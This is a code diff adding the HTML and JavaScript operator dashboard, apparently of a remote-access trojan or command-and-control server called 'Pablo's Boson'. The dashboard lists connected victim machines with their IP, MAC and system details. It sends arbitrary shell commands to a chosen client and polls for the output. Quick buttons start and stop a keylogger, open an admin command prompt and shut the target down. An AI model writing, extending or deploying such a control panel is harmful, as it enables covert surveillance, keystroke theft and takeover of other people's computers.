@@ -1,0 +1,812 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pablo's Boson - Command Center</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #4361ee;
+            --secondary-color: #3f37c9;
+            --success-color: #4cc9f0;
+            --info-color: #4895ef;
+            --warning-color: #f72585;
+            --danger-color: #e63946;
+            --light-color: #f8f9fa;
+            --dark-color: #212529;
+        }
+        
+        body { 
+            background-color: #f0f2f5; 
+            font-family: 'Poppins', sans-serif;
+        }
+        
+        .navbar {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 0.8rem 1rem;
+        }
+        
+        .navbar-brand {
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .card {
+            margin-bottom: 20px;
+            border-radius: 10px;
+            border: none;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 15px rgba(0,0,0,0.1);
+        }
+        
+        .card-header {
+            border-radius: 10px 10px 0 0 !important;
+            font-weight: 600;
+            padding: 1rem 1.5rem;
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            color: white;
+        }
+        
+        .card-header.bg-success {
+            background: linear-gradient(135deg, #2ecc71, #27ae60) !important;
+        }
+        
+        .card-header.bg-info {
+            background: linear-gradient(135deg, #3498db, #2980b9) !important;
+        }
+        
+        .card-header.bg-warning {
+            background: linear-gradient(135deg, #f39c12, #d35400) !important;
+        }
+        
+        .card-header.bg-danger {
+            background: linear-gradient(135deg, #e74c3c, #c0392b) !important;
+        }
+        
+        .command-btn {
+            margin: 5px;
+            width: 220px;
+            text-align: left;
+            border-radius: 8px;
+            transition: all 0.3s;
+            border: none;
+            background-color: #f8f9fa;
+            color: #333;
+            font-weight: 500;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .command-btn:hover {
+            background-color: var(--primary-color);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        
+        .response-log {
+            height: 450px;
+            overflow-y: auto;
+            background-color: #1e1e2e;
+            border-radius: 12px;
+            padding: 15px;
+            scrollbar-width: thin;
+            scrollbar-color: var(--primary-color) #2d2d3a;
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .response-log::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .response-log::-webkit-scrollbar-track {
+            background: #2d2d3a;
+            border-radius: 10px;
+        }
+        
+        .response-log::-webkit-scrollbar-thumb {
+            background-color: var(--primary-color);
+            border-radius: 10px;
+        }
+        
+        .log-entry {
+            padding: 12px 16px;
+            margin: 10px 0;
+            border-radius: 8px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.1);
+            animation: fadeIn 0.3s ease-in-out;
+            position: relative;
+            overflow: hidden;
+            color: #f8f8f2;
+            line-height: 1.5;
+        }
+        
+        .log-entry strong {
+            color: #bd93f9;
+            font-weight: 600;
+        }
+        
+        .log-entry::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--primary-color), var(--secondary-color));
+            opacity: 0.7;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .log-command {
+            background-color: #2c3e50;
+            border: 1px solid rgba(67, 97, 238, 0.2);
+        }
+        
+        .log-command::before {
+            background: linear-gradient(to bottom, #4361ee, #3a0ca3);
+        }
+        
+        .log-response {
+            background-color: #2d3436;
+            border: 1px solid rgba(76, 201, 240, 0.2);
+        }
+        
+        .log-response::before {
+            background: linear-gradient(to bottom, #4cc9f0, #4895ef);
+        }
+        
+        .log-error {
+            background-color: #3d2c2e;
+            border: 1px solid rgba(230, 57, 70, 0.2);
+        }
+        
+        .log-error::before {
+            background: linear-gradient(to bottom, #e63946, #d90429);
+        }
+        
+        .log-entry .timestamp {
+            color: #8be9fd;
+            font-weight: 500;
+        }
+        
+        .log-entry .client-name {
+            color: #50fa7b;
+            font-weight: 600;
+        }
+        
+        .log-entry .command-text {
+            color: #ffb86c;
+            font-weight: 500;
+        }
+        
+        .log-entry .error-text {
+            color: #ff5555;
+        }
+        
+        .log-entry pre {
+            margin-top: 8px;
+            padding: 8px;
+            background-color: rgba(0,0,0,0.2);
+            border-radius: 4px;
+            overflow-x: auto;
+            color: #f8f8f2;
+            font-size: 0.9rem;
+        }
+        
+        .client-info {
+            max-height: 300px;
+            overflow-y: auto;
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 15px;
+            line-height: 1.7;
+        }
+        
+        .client-info p {
+            margin-bottom: 8px;
+            border-bottom: 1px dashed #eee;
+            padding-bottom: 8px;
+        }
+        
+        .client-info strong {
+            color: var(--primary-color);
+        }
+        
+        .user-info {
+            font-size: 0.9rem;
+            background-color: rgba(255,255,255,0.1);
+            padding: 5px 10px;
+            border-radius: 20px;
+        }
+        
+        .list-group-item {
+            border-left: none;
+            border-right: none;
+            padding: 12px 20px;
+            transition: all 0.3s;
+        }
+        
+        .list-group-item:first-child {
+            border-top: none;
+        }
+        
+        .list-group-item:last-child {
+            border-bottom: none;
+        }
+        
+        .list-group-item.active {
+            background-color: var(--primary-color);
+            border-color: var(--primary-color);
+        }
+        
+        .list-group-item:hover:not(.active) {
+            background-color: #f8f9fa;
+            transform: translateX(5px);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            border: none;
+            box-shadow: 0 4px 6px rgba(67, 97, 238, 0.3);
+            transition: all 0.3s;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(67, 97, 238, 0.4);
+        }
+        
+        .btn-outline-light {
+            border-width: 2px;
+            font-weight: 500;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        
+        .btn-outline-light:hover {
+            transform: translateY(-2px);
+        }
+        
+        .input-group {
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        
+        .form-control {
+            border: none;
+            padding: 12px 20px;
+            font-size: 1rem;
+        }
+        
+        .form-control:focus {
+            box-shadow: none;
+            border-color: var(--primary-color);
+        }
+        
+        .quick-commands-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        
+        .status-online {
+            background-color: #4cc9f0;
+            box-shadow: 0 0 0 3px rgba(76, 201, 240, 0.3);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(76, 201, 240, 0.7); }
+            70% { box-shadow: 0 0 0 5px rgba(76, 201, 240, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(76, 201, 240, 0); }
+        }
+        
+        .section-title {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .section-title i {
+            margin-right: 8px;
+        }
+        
+        .dashboard-footer {
+            text-align: center;
+            padding: 15px 0;
+            color: #6c757d;
+            font-size: 0.9rem;
+            margin-top: 20px;
+        }
+        
+        .refresh-btn {
+            position: absolute;
+            right: 15px;
+            top: 12px;
+            background: rgba(255,255,255,0.2);
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
+        }
+        
+        .refresh-btn:hover {
+            background: rgba(255,255,255,0.3);
+            transform: rotate(180deg);
+        }
+        
+        .client-details {
+            animation: fadeIn 0.5s;
+        }
+        
+        .progress {
+            height: 8px;
+            border-radius: 4px;
+            background-color: #e9ecef;
+        }
+        
+        .progress-bar {
+            border-radius: 4px;
+        }
+        
+        .badge {
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar navbar-expand-lg navbar-dark mb-4">
+        <div class="container-fluid">
+            <a class="navbar-brand" href="#">
+                <i class="fas fa-shield-alt me-2"></i>Pablo's Boson
+            </a>
+            <div class="d-flex align-items-center">
+                <span class="text-white user-info me-3">
+                    <i class="fas fa-user-circle me-1"></i>Logged in as: <strong>{{ current_user.id }}</strong>
+                </span>
+                <a href="{{ url_for('logout') }}" class="btn btn-outline-light btn-sm">
+                    <i class="fas fa-sign-out-alt me-1"></i>Logout
+                </a>
+            </div>
+        </div>
+    </nav>
+    
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Client List and Info -->
+            <div class="col-md-3">
+                <div class="card">
+                    <div class="card-header position-relative">
+                        <i class="fas fa-laptop me-2"></i>Connected Clients
+                        <button class="refresh-btn" onclick="refreshClients()" title="Refresh client list">
+                            <i class="fas fa-sync-alt text-white"></i>
+                        </button>
+                    </div>
+                    <div class="card-body p-0">
+                        <div class="list-group list-group-flush" id="client-list">
+                            <a href="#" class="list-group-item list-group-item-action disabled">
+                                <i class="fas fa-circle-notch fa-spin me-2"></i>Loading clients...
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card">
+                    <div class="card-header bg-info">
+                        <i class="fas fa-info-circle me-2"></i>Client Information
+                    </div>
+                    <div class="card-body">
+                        <div class="client-info" id="client-info">
+                            <div class="text-center py-4">
+                                <i class="fas fa-desktop fa-3x mb-3 text-muted"></i>
+                                <p class="mb-0">Select a client to view details</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Command Panel -->
+            <div class="col-md-9">
+                <div class="card">
+                    <div class="card-header bg-success">
+                        <i class="fas fa-terminal me-2"></i>Command Center
+                    </div>
+                    <div class="card-body">
+                        <!-- Custom Command -->
+                        <div class="input-group mb-4">
+                            <span class="input-group-text bg-light">
+                                <i class="fas fa-chevron-right text-primary"></i>
+                            </span>
+                            <input type="text" class="form-control" id="command-input" placeholder="Enter command...">
+                            <button class="btn btn-primary" type="button" onclick="sendCommand()">
+                                <i class="fas fa-paper-plane me-1"></i>Send
+                            </button>
+                        </div>
+                        
+                        <!-- Quick Commands -->
+                        <h6 class="section-title"><i class="fas fa-bolt"></i>Quick Commands</h6>
+                        <div class="quick-commands-container mb-4">
+                            <button class="btn command-btn" data-command="systeminfo">
+                                <i class="fas fa-info-circle me-2 text-info"></i>System Info
+                            </button>
+                            <button class="btn command-btn" data-command="ipconfig">
+                                <i class="fas fa-wifi me-2 text-info"></i>IP Config
+                            </button>
+                            <button class="btn command-btn" data-command="netstat -ano">
+                                <i class="fas fa-network-wired me-2 text-info"></i>Network Stats
+                            </button>
+                            <button class="btn command-btn" data-command="whoami">
+                                <i class="fas fa-user me-2 text-primary"></i>Current User
+                            </button>
+                            <button class="btn command-btn" data-command="get_owner">
+                                <i class="fas fa-user-shield me-2 text-primary"></i>Owner Info
+                            </button>
+                            <button class="btn command-btn" data-command="dir">
+                                <i class="fas fa-folder-open me-2 text-warning"></i>List Files
+                            </button>
+                            <button class="btn command-btn" data-command="tasklist">
+                                <i class="fas fa-list me-2 text-warning"></i>Task List
+                            </button>
+                            <button class="btn command-btn" data-command="keylog_start">
+                                <i class="fas fa-keyboard me-2 text-success"></i>Start Keylogger
+                            </button>
+                            <button class="btn command-btn" data-command="keylog_stop">
+                                <i class="fas fa-stop-circle me-2 text-danger"></i>Stop Keylogger
+                            </button>
+                            <button class="btn command-btn" data-command="open_cmd">
+                                <i class="fas fa-terminal me-2 text-dark"></i>Open CMD
+                            </button>
+                            <button class="btn command-btn" data-command="open_cmd_admin">
+                                <i class="fas fa-user-shield me-2 text-danger"></i>CMD (Admin)
+                            </button>
+                            <button class="btn command-btn" data-command="open_calculator">
+                                <i class="fas fa-calculator me-2 text-success"></i>Calculator
+                            </button>
+                            <button class="btn command-btn" data-command="open_notepad">
+                                <i class="fas fa-edit me-2 text-primary"></i>Notepad
+                            </button>
+                            <button class="btn command-btn" data-command="shutdown">
+                                <i class="fas fa-power-off me-2 text-danger"></i>Shutdown
+                            </button>
+                        </div>
+                        
+                        <!-- Response Log -->
+                        <h6 class="section-title"><i class="fas fa-terminal"></i>Response Terminal</h6>
+                        <div class="response-log" id="response-log">
+                            <div class="log-entry log-command">
+                                <span class="timestamp">[System]</span> <strong>System:</strong> Terminal initialized. Waiting for client responses...
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="dashboard-footer">
+            <p>Pablo's Boson Client Management System &copy; 2024</p>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Handle AJAX authentication errors
+        $(document).ajaxError(function(event, jqXHR, settings, thrownError) {
+            if (jqXHR.status === 401) {
+                // Redirect to login page if unauthorized
+                window.location.href = '/login';
+            }
+        });
+        
+        // Command handling
+        $('.command-btn').click(function() {
+            const command = $(this).data('command');
+            $('#command-input').val(command);
+            sendCommand();
+        });
+
+        // Handle Enter key press in command input
+        $('#command-input').keypress(function(e) {
+            if (e.which === 13) {
+                sendCommand();
+                return false;
+            }
+        });
+
+        function sendCommand() {
+            const clientId = $('#client-list .active').data('id');
+            const command = $('#command-input').val();
+            
+            if (!clientId) {
+                addLogEntry('Please select a client first!', 'error');
+                return;
+            }
+
+            if (!command) {
+                addLogEntry('Please enter a command!', 'error');
+                return;
+            }
+
+            // Show loading state
+            const sendBtn = $('button[onclick="sendCommand()"]');
+            const originalBtnHtml = sendBtn.html();
+            sendBtn.html('<i class="fas fa-spinner fa-spin"></i> Sending...');
+            sendBtn.prop('disabled', true);
+
+            $.post('/command', {
+                client_id: clientId,
+                command: command
+            }, function(data) {
+                if (data.status === 'success') {
+                    addLogEntry(`Command sent to ${clientId}: ${command}`, 'command');
+                    $('#command-input').val('');
+                } else {
+                    addLogEntry(`Error: ${data.message}`, 'error');
+                }
+            }).fail(function(xhr) {
+                if (xhr.status !== 401) {
+                    addLogEntry('Failed to send command!', 'error');
+                }
+            }).always(function() {
+                // Restore button state
+                sendBtn.html(originalBtnHtml);
+                sendBtn.prop('disabled', false);
+            });
+        }
+
+        // Client management
+        function refreshClients() {
+            const refreshBtn = $('.refresh-btn i');
+            refreshBtn.addClass('fa-spin');
+            
+            $.get('/clients', function(data) {
+                const clientList = $('#client-list');
+                const currentActive = clientList.find('.active').data('id');
+                
+                clientList.empty();
+                
+                if (data.clients.length === 0) {
+                    clientList.append(`
+                        <a href="#" class="list-group-item list-group-item-action disabled">
+                            <i class="fas fa-exclamation-circle me-2 text-muted"></i>No clients connected
+                        </a>
+                    `);
+                    return;
+                }
+                
+                data.clients.forEach(client => {
+                    const item = $(`
+                        <a href="#" class="list-group-item list-group-item-action">
+                            <span class="status-indicator status-online"></span>
+                            <strong>${client.hostname}</strong><br>
+                            <small class="text-muted">${client.ip}</small>
+                        </a>
+                    `);
+                    
+                    item.data('id', client.id);
+                    
+                    item.click(function() {
+                        $('#client-list .list-group-item').removeClass('active');
+                        $(this).addClass('active');
+                        loadClientInfo(client.id);
+                    });
+                    
+                    clientList.append(item);
+                    
+                    // Restore active selection if it still exists
+                    if (client.id === currentActive) {
+                        item.addClass('active');
+                    }
+                });
+            }).fail(function(xhr) {
+                if (xhr.status !== 401) {
+                    console.error('Failed to refresh clients');
+                }
+            }).always(function() {
+                refreshBtn.removeClass('fa-spin');
+            });
+        }
+
+        // Load client system info
+        function loadClientInfo(clientId) {
+            $('#client-info').html(`
+                <div class="text-center py-4">
+                    <i class="fas fa-spinner fa-spin fa-2x mb-3 text-primary"></i>
+                    <p class="mb-0">Loading client information...</p>
+                </div>
+            `);
+            
+            $.get(`/client_info/${clientId}`, function(data) {
+                if (data.error) {
+                    $('#client-info').html(`
+                        <div class="alert alert-danger">
+                            <i class="fas fa-exclamation-triangle me-2"></i>${data.error}
+                        </div>
+                    `);
+                    return;
+                }
+                
+                const info = data.system_info;
+                
+                // Format disk information
+                const diskInfo = info.resources.disks.map(d => {
+                    const usedPercent = ((d.total_gb - d.free_gb) / d.total_gb * 100).toFixed(0);
+                    const progressClass = usedPercent > 90 ? 'danger' : usedPercent > 70 ? 'warning' : 'success';
+                    
+                    return `
+                        <div class="mb-2">
+                            <div class="d-flex justify-content-between mb-1">
+                                <small>${d.mountpoint}</small>
+                                <small>${d.free_gb}/${d.total_gb} GB free</small>
+                            </div>
+                            <div class="progress" style="height: 8px;">
+                                <div class="progress-bar bg-${progressClass}" role="progressbar" 
+                                     style="width: ${usedPercent}%" aria-valuenow="${usedPercent}" 
+                                     aria-valuemin="0" aria-valuemax="100"></div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+                
+                const html = `
+                    <div class="client-details">
+                        <div class="text-center mb-3">
+                            <i class="fas fa-desktop fa-3x mb-2 text-primary"></i>
+                            <h5>${info.basic.hostname}</h5>
+                            <span class="badge bg-info">${info.basic.os} ${info.basic.os_version}</span>
+                        </div>
+                        
+                        <div class="row mt-4">
+                            <div class="col-6">
+                                <p><i class="fas fa-microchip me-2 text-primary"></i><strong>CPU:</strong> ${info.resources.cpu_cores} cores</p>
+                            </div>
+                            <div class="col-6">
+                                <p><i class="fas fa-memory me-2 text-primary"></i><strong>RAM:</strong> ${info.resources.total_ram} GB</p>
+                            </div>
+                        </div>
+                        
+                        <p><i class="fas fa-network-wired me-2 text-primary"></i><strong>IP:</strong> ${info.network.ip_address}</p>
+                        <p><i class="fas fa-fingerprint me-2 text-primary"></i><strong>MAC:</strong> ${info.network.mac_address}</p>
+                        
+                        <h6 class="mt-3 mb-2"><i class="fas fa-hdd me-2 text-primary"></i><strong>Storage:</strong></h6>
+                        ${diskInfo}
+                    </div>
+                `;
+                
+                $('#client-info').html(html);
+            }).fail(function(xhr) {
+                if (xhr.status !== 401) {
+                    $('#client-info').html(`
+                        <div class="alert alert-danger">
+                            <i class="fas fa-exclamation-triangle me-2"></i>Failed to load client info!
+                        </div>
+                    `);
+                }
+            });
+        }
+
+        // Response handling
+        function addLogEntry(message, type = 'response') {
+            const timestamp = new Date().toLocaleTimeString();
+            let formattedMessage = message;
+            
+            // Format the message based on type
+            if (type === 'command') {
+                // For command entries
+                if (message.includes('Command sent to')) {
+                    // Extract client and command
+                    const parts = message.match(/Command sent to (.*?): (.*)/);
+                    if (parts && parts.length >= 3) {
+                        const client = parts[1];
+                        const command = parts[2];
+                        formattedMessage = `<strong>Command to <span class="client-name">${client}</span>:</strong> <span class="command-text">${command}</span>`;
+                    }
+                } else {
+                    formattedMessage = `<strong>System:</strong> ${message}`;
+                }
+            } else if (type === 'error') {
+                // For error entries
+                formattedMessage = `<strong>Error:</strong> <span class="error-text">${message}</span>`;
+            } else {
+                // For response entries
+                if (message.includes('<span class="text-primary">')) {
+                    // Extract client and response
+                    const parts = message.split('<br>');
+                    if (parts.length >= 2) {
+                        const client = parts[0].replace('<span class="text-primary">', '<span class="client-name">').replace(':</span>', '</span>:');
+                        const response = parts[1];
+                        
+                        // Check if response is a command output (contains multiple lines)
+                        if (response.includes('\n')) {
+                            formattedMessage = `${client}<pre>${response}</pre>`;
+                        } else {
+                            formattedMessage = `${client} ${response}`;
+                        }
+                    }
+                }
+            }
+            
+            const entry = $('<div class="log-entry"></div>')
+                .addClass(`log-${type}`)
+                .html(`<span class="timestamp">[${timestamp}]</span> ${formattedMessage}`);
+            
+            $('#response-log').append(entry);
+            
+            // Limit the number of entries to prevent memory issues
+            if ($('#response-log .log-entry').length > 100) {
+                $('#response-log .log-entry').first().remove();
+            }
+            
+            // Auto-scroll to bottom
+            $('#response-log').scrollTop($('#response-log')[0].scrollHeight);
+        }
+
+        // Auto-refresh responses
+        setInterval(function() {
+            $.get('/responses', function(data) {
+                data.responses.forEach(([client, response, command]) => {
+                    // Format the response for better display
+                    let formattedResponse = response;
+                    
+                    // If response contains multiple lines, preserve formatting
+                    if (response.includes('\n')) {
+                        formattedResponse = response.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+                    }
+                    
+                    addLogEntry(`<span class="text-primary">${client}:</span><br>${formattedResponse}`, 'response');
+                });
+            }).fail(function(xhr) {
+                if (xhr.status !== 401) {
+                    console.error('Failed to fetch responses');
+                }
+            });
+        }, 2000);
+
+        // Initial setup
+        $(document).ready(function() {
+            refreshClients();
+            setInterval(refreshClients, 5000);
+            
+            // Clear the default log entry and add a styled one
+            $('#response-log').empty();
+            addLogEntry('Terminal initialized. Ready to send commands.', 'command');
+        });
+    </script>
+</body>
+</html>
